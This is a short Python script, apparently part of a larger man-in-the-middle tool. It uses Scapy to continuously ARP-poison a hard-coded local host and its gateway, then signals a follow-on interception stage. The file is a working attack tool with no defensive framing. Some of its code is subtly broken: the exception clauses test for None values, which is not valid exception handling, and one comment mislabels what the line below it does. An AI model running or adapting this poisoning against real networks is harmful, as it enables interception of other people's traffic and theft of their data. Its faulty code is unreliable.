from scapy.all import ARP, Ether, send, conf, sendp
import time
from router_ip_mac import get_router_ip, get_mac

# Disable Scapy's SSL verification
conf.verb = 0  # Disable verbose output

def poison(target_ip, target_mac, spoof_ip):
    arp_response = ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
    ether = Ether(dst=target_mac)
    package = ether / arp_response
    sendp(package)


def ARP_poison(start_mitm_event):
    try:
        target_ip = "192.168.2.103"
        gateway_ip = get_router_ip()
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)


        print(f"Target MAC: {target_mac}, Gateway MAC: {gateway_mac}")
        while True:
            # Poison the target
            poison(target_ip, target_mac, gateway_ip)
            # Poison the gateway
            poison(gateway_ip, gateway_mac, target_ip)
            time.sleep(2)  # Send every 2 seconds
            start_mitm_event.set()
    except KeyboardInterrupt:
        print("\nRestoring ARP tables. . .")
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=4, verbose=False)
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=4, verbose=False)
        print("\nARP tables restored.")

    except target_mac is None:
        print("Could not find target MAC")
    except gateway_mac is None:
        print("Could not find gateway MAC")
    except gateway_ip is None:
        print("Could not find gateway IP")
    except target_ip is None:
        print("Target IP doesn't exist")
